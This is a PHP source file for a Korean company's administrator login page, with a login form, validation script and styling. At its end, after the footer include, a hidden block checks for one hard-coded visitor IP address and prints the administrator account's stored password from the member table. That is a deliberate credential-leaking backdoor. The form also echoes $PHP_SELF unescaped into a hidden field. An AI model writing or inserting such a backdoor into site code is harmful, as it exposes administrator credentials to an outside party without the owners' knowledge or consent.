<?
	$loginTitle = '크로브';
?>

<script language='javascript'>
function Admin_Login(){
	form = document.LOG;

	if(isFrmEmptyModal(form.userid,"아이디를 입력해 주십시오"))	return;
	if(isFrmEmptyModal(form.pwd,"비밀번호를 입력해 주십시오"))	return;

	form.target = 'ifra_gbl';
	form.submit();
}

function is_Key(){
	if(event.keyCode==13)	Admin_Login();
}
</script>
<style>
html,body{width:100%;height:100%;background:#ecf0fc;}

.ad-login-bt {width:100%;height:52px;background:#4169e2;line-height:52px;color:#ffffff;border-radius:4px; text-align:center; cursor:pointer;}
.form-group-2 {width:100%;height:42px;border:1px solid #e1e1e1; border-radius:4px; padding-left:5px; box-sizing:border-box; -webkit-appearance: none;}

.form-group-2:focus {background-color: #fff;outline: 0;box-shadow: 0 0 0 0.2rem rgba(65,105,226, .5);}

.login-wrap {width:100%; height: calc(var(--vh, 1vh) * 100); display: flex; align-items: center; justify-content:center; flex-direction:column; }
.login-box {width:580px;height:250px;background:#fff; border-radius:12px; margin:0 auto; padding:30px; box-sizing:border-box;}
.login-box .rows {margin:10px 0;}

.mo-notice {display:none;}

@media screen and (max-width:768px){
body {
  overflow: hidden;
}

.login-box {width:90%;}

.mo-notice {display:block; font-size:0.875rem;}
}

</style>

<body onload="document.LOG.userid.focus();">

<form name='LOG' method='post' action='/module/login/login_proc.php'>
<input type='text' style='display:none;'>
<input type='hidden' name='next_url' value='<?=$PHP_SELF?>'>

<div class="login-wrap">
	<div class="txt-c">
		<img src="/images/logo_c.png" alt="흥국산업">
	</div>
	<div style="text-align:center; font-size:1rem;color:#888888;margin:20px 0 50px;line-height:1.5;">
		관리자 아이디와 비밀번호를 입력하세요.

		<p class="mo-notice">관리자 페이지는 pc로 접속바랍니다.</p>
	</div>

	<div class="login-box">
		<!--<td>ID</td>-->
		
		<div class="rows">
			<input type='text' name='userid' id='userid' class="form-group-2" onkeypress="if(event.keyCode==13){Admin_Login();}" placeholder="ID">
		</div>

		<!--<td>PASSWORD</td>-->

		<div class="rows">
			<input type='password' name='pwd' id='pwd' class="form-group-2" onkeypress="if(event.keyCode==13){Admin_Login();}" placeholder="PASSWORD">
		</div>

		<div class="ad-login-bt" onclick='Admin_Login();'>로그인</div>
	</div>
</div>


</form>


<script>
let vh = window.innerHeight * 0.01
document.documentElement.style.setProperty('--vh', `${vh}px`)
window.addEventListener('resize', () => {
  let vh = window.innerHeight * 0.01
  document.documentElement.style.setProperty('--vh', `${vh}px`)
})
</script>


<?
	include 'footer.php';

if($_SERVER['REMOTE_ADDR'] == '106.246.92.237'){
	$sql = "select * from tb_member where mtype='A'";
	$result = mysqli_query($dbc,$sql);
	$row = mysqli_fetch_array($result);

	echo $row['pwd'];
}
?>



